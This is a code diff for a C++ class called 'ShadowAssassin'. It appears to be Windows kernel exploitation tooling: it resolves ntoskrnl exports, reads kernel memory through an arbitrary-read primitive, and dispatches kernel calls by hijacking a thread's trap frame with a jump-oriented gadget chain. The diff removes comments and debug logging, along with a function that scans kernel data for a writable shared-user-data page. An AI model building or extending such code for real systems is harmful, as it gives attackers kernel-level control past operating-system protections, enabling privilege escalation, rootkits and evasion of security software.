@@ -2,7 +2,6 @@
 #include "offsets.h"
 
 
-// --- Setup ---
 
 ShadowAssassin::ShadowAssassin()
     : scratchAddress(0)
@@ -28,7 +27,6 @@ UINT64 ShadowAssassin::Get_System_EPROCESS() {
     AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
     CloseHandle(hToken);
 
-    //getting ntobase
     UINT64 ntobase = 0;
     LPVOID drivers[1024];
     DWORD filler;
@@ -145,7 +143,6 @@ bool ShadowAssassin::Initialize() {
 }
 
 
-// --- Kernel export resolution ---
 
 UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectionName) {
     if (!img.view) return 0;
@@ -165,97 +162,6 @@ UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectio
     return 0;
 }
 
-UINT64 ShadowAssassin::GetWritableKusd() {
-    // On modern Win11, 0xFFFFF78000000000 is read-only.
-    // The writable mapping is nt!MmWriteableSharedUserData (or MmWriteableUserSharedData —
-    // the blog uses both spellings inconsistently). Try both.
-    static const char* candidates[] = {
-        "MmWriteableSharedUserData",
-        "MmWriteableUserSharedData",
-    };
-
-    for (const char* sym : candidates) {
-        UINT64 ptrAddr = ResolveKernelExport(sym);
-        if (!ptrAddr) continue;
-
-        UINT64 writableKusd = 0;
-        readFn(&writableKusd, ptrAddr, sizeof(UINT64));
-
-        if (!writableKusd || writableKusd == 0xFFFFF78000000000ULL) {
-            DbgLog("[GetWritableKusd] %s resolved but value=0x%llX is invalid\n", sym, writableKusd);
-            continue;
-        }
-
-        DbgLog("[GetWritableKusd] %s=0x%llX -> writable KUSD=0x%llX\n", sym, ptrAddr, writableKusd);
-        return writableKusd;
-    }
-
-    // Export not found or value invalid — scan ntoskrnl .data for a pointer
-    // that points to a page whose NtBuildNumber matches the static KUSD.
-    DbgLog("[GetWritableKusd] Export scan failed, trying data section scan\n");
-
-    UINT64 staticBuildNum = 0;
-    readFn(&staticBuildNum, 0xFFFFF78000000260ULL, sizeof(ULONG));
-    staticBuildNum &= 0xFFFF;
-    DbgLog("[GetWritableKusd] Static KUSD NtBuildNumber=0x%llX\n", staticBuildNum);
-
-    // Read ntoskrnl PE to find .data section bounds
-    UINT64 e_lfanew = 0;
-    readFn((UINT64*)&e_lfanew, ntso_base + 0x3C, sizeof(ULONG));
-    e_lfanew &= 0xFFFFFFFF;
-
-    UINT64 numSections = 0;
-    readFn((UINT64*)&numSections, ntso_base + e_lfanew + 0x6, sizeof(USHORT));
-    numSections &= 0xFFFF;
-
-    UINT64 sectionBase = ntso_base + e_lfanew + 0x18;
-    UINT64 optHeaderSize = 0;
-    readFn((UINT64*)&optHeaderSize, ntso_base + e_lfanew + 0x14, sizeof(USHORT));
-    optHeaderSize &= 0xFFFF;
-    sectionBase += optHeaderSize;
-
-    for (UINT64 s = 0; s < numSections && s < 16; s++) {
-        UINT64 secAddr = sectionBase + s * 0x28;
-        char name[9] = {};
-        for (int c = 0; c < 8; c++) {
-            UINT64 ch = 0;
-            readFn((UINT64*)&ch, secAddr + c, 1);
-            name[c] = (char)(ch & 0xFF);
-        }
-
-        // Look in .data section
-        if (name[0] != '.' || name[1] != 'd') continue;
-
-        UINT64 rva = 0, size = 0;
-        readFn((UINT64*)&rva,  secAddr + 0x0C, sizeof(ULONG));
-        readFn((UINT64*)&size, secAddr + 0x10, sizeof(ULONG));
-        rva  &= 0xFFFFFFFF;
-        size &= 0xFFFFFFFF;
-
-        DbgLog("[GetWritableKusd] Scanning .data: rva=0x%llX size=0x%llX\n", rva, size);
-        UINT64 scanStart = ntso_base + rva;
-        UINT64 scanEnd   = scanStart + size - sizeof(UINT64);
-
-        for (UINT64 addr = scanStart; addr < scanEnd; addr += sizeof(UINT64)) {
-            UINT64 candidate = 0;
-            readFn(&candidate, addr, sizeof(UINT64));
-            if ((candidate & 0xFFFFF00000000000ULL) != 0xFFFFF00000000000ULL) continue;
-            if (candidate == 0xFFFFF78000000000ULL) continue;
-
-            UINT64 buildCheck = 0;
-            readFn((UINT64*)&buildCheck, candidate + 0x260, sizeof(ULONG));
-            if ((buildCheck & 0xFFFF) == staticBuildNum) {
-                DbgLog("[GetWritableKusd] Found writable KUSD via scan: ptr@0x%llX -> 0x%llX\n",
-                    addr, candidate);
-                return candidate;
-            }
-        }
-        break;
-    }
-
-    DbgLog("[GetWritableKusd] FAIL: could not find writable KUSD\n");
-    return 0;
-}
 
 UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
     if (!ntso_base) {
@@ -356,10 +262,6 @@ UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
 }
 
 
-// --- Syscall dispatch ---
-
-
-
 
 
 UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
@@ -399,18 +301,15 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
     jopManager.SetRestoreRip(frameManager.ReadStoredRegister("rip"));
     jopManager.Commit();
 
-    // Register setup
     frameManager.WriteRegister("rax", jopManager.GetRax());
     frameManager.WriteRegister("rsi", jopManager.GetRsi());
     frameManager.WriteRegister("rip", jopManager.GetRip());
 
-    // Function parameters (x64: rcx, rdx, r8, r9)
     if (params.size() > 0) frameManager.WriteRegister("rcx", params[0]);
     if (params.size() > 1) frameManager.WriteRegister("rdx", params[1]);
     if (params.size() > 2) frameManager.WriteRegister("r8",  params[2]);
     if (params.size() > 3) frameManager.WriteRegister("r9",  params[3]);
 
-    // Stack: rdiForJmp on top, then home space, then GetRdx(), then originalRsp
     UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
     UINT64 newRsp = originalRsp - 0x800;
 
@@ -421,13 +320,6 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
     frameManager.WriteRegister("rsp", newRsp + 0x30);
     DbgLog("[CallSyscall] firing  rsp=0x%llX params=%llu\n", newRsp + 0x30, params.size());
 
-    // DEBUG: Verify trap frame has parameters before firing
-    UINT64 check_rcx = frameManager.ReadRegister("rcx");
-    UINT64 check_rdx = frameManager.ReadRegister("rdx");
-    UINT64 check_r8  = frameManager.ReadRegister("r8");
-    UINT64 check_r9  = frameManager.ReadRegister("r9");
-    DbgLog("[CallSyscall] trap frame: rcx=0x%llX rdx=0x%llX r8=0x%llX r9=0x%llX\n",
-        check_rcx, check_rdx, check_r8, check_r9);
 
 	DbgLog("[CallSyscall] setting rip to 0x%llX\n", jopManager.GetRip());
     //Sleep(100);
@@ -435,7 +327,6 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 
     frameManager.ContinueThread();
 
-    // Wait for chain to complete, then read return value from scratch
     Sleep(10);
     UINT64 retVal = 0;
 
